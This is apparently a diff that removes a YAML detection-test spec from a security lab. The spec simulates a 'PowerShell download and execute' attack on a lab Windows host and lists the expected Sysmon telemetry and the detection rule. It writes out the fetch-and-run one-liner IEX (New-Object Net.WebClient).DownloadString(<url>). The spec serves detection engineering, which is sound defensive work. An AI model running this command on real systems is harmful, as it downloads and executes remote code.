@@ -1,9 +1,0 @@
-id: SIM-003
-attack: {label: Attk103, tactic: execution, name: "PowerShell download and execute"}
-tool: {name: "PowerShell DownloadString", file: "04-attacks/Attk103_psuedoattacks.ps1", command: "IEX (New-Object Net.WebClient).DownloadString(<url>)"}
-target: {host: WIN-JCNJR9HDAMK, ip: 192.168.64.2}
-expected_telemetry:
-  - {source: XmlWinEventLog:Microsoft-Windows-Sysmon/Operational, event_id: 1, must_contain: {Image: "*powershell.exe", CommandLine: "*DownloadString*"}}
-  - {source: XmlWinEventLog:Microsoft-Windows-Sysmon/Operational, event_id: 3, must_contain: {DestinationIp: "192.168.64.1", DestinationPort: "8000"}}
-expected_detection: {rule_id: RULE-ATTK103-001, max_ttd_seconds: 120}
-verdict: null
